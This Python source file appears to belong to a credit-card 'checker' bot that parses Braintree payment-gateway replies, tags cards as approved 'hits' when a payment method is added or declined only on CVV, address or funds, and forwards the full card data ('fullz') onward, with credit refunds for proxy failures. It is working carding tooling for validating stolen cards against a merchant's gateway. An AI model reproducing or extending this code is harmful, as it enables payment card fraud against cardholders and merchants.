import traceback
from FUNC.defs import *
from FUNC.usersdb_func import *

async def get_charge_resp(result, user_id, fullcc):
    try:
        # Initialize variables with default values
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        response = "Unknown error"
        hits = "NO"

        if isinstance(result, str):  # Use isinstance for type checking
            if "Nice! New payment method added" in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Payment Method Added Successfully"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "Payment method successfully added." in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Payment Method Added Successfully"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)
            elif "There was an error saving your payment method. Reason: Card Issuer Declined CVV" in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Card Issuer Declined CVV"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: Invalid postal code and cvv" in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Invalid Postal Code or CVV"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: Invalid postal code or street address." in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Invalid Postal Code or Street Address."
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: Insufficient Funds" in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Insufficient Funds"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: CVV" in result or "There was an error saving your payment method. Reason: CVV" in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "CVV"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: Card Issuer Declined CVV." in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "Card Issuer Declined CVV"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "There was an error saving your payment method. Reason: CVV." in result:
                status = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅"
                response = "CVV"
                hits = "YES"
                await forward_resp(fullcc, "BRAINTREE AUTH", response)

            elif "Status code cvv: Gateway Rejected: cvv" in result:
                response = "Gateway Rejected: cvv"

            elif "Declined - Call Issuer" in result:
                response = "Declined - Call Issuer"

            elif "Cannot Authorize at this time" in result:
                response = "Cannot Authorize at this time"

            elif "Processor Declined - Fraud Suspected" in result:
                response = "Fraud Suspected"

            elif "There was an error saving your payment method. Reason: Gateway Rejected: risk_threshold" in result:
                response = "Gateway Rejected: risk_threshold"

            elif "There was an error saving your payment method. Reason: Card Not Activated" in result:
                response = "Card Not Activated"

            elif "There was an error saving your payment method. Reason: Closed Card" in result:
                response = "Closed Card"

            elif "There was an error saving your payment method. Reason: No Such Issuer" in result:
                response = "No Such Issuer"

            elif "There was an error saving your payment method. Reason: Declined" in result :
                response = "Declined"

            elif "There was an error saving your payment method. Reason: Transaction Not Allowed" in result:
                response = "Transaction Not Allowed"

            elif "There was an error saving your payment method. Reason: Processor Declined" in result:
                response = "Processor Declined"

            elif "There was an error saving your payment method. Reason: Do Not Honor" in result:
                response = "Do Not Honor"
            
            elif "There was an error saving your payment method. Reason: No Account" in result:
                response = "No Account"

            elif ("We're sorry, but the payment validation failed. Declined - Call Issuer" in result or
                  "Payment failed: Declined - Call Issuer" in result):
                response = "Declined - Call Issuer"

            elif "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds." in result:
                response = "Wait 20 sec. before adding new"

            elif "ProxyError" in result:
                response = "Proxy Connection Refused"
                await refundcredit(user_id)

            else:
                # Attempt to parse the message
                try:
                    if '"message": "' in result:
                        response = result.split('"message": "')[1].split('"')[0] + " ❌"
                    else:
                        response = result
                except Exception as e:
                    response = f"Error parsing message: {str(e)}"
                    await result_logs(fullcc, "Braintree Auth", result)

        # Return JSON response
        json_response = {
            "status": status,
            "response": response,
            "hits": hits,
            "fullz": fullcc,
        }
        return json_response

    except Exception as e:
        # Log the full exception traceback for debugging
        status = "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"
        response = str(e) + " ❌"
        hits = "NO"
        await result_logs(fullcc, "Braintree Auth Error", traceback.format_exc())

        # Return the error JSON response
        json_response = {
            "status": status,
            "response": response,
            "hits": hits,
            "fullz": fullcc,
        }
        return json_response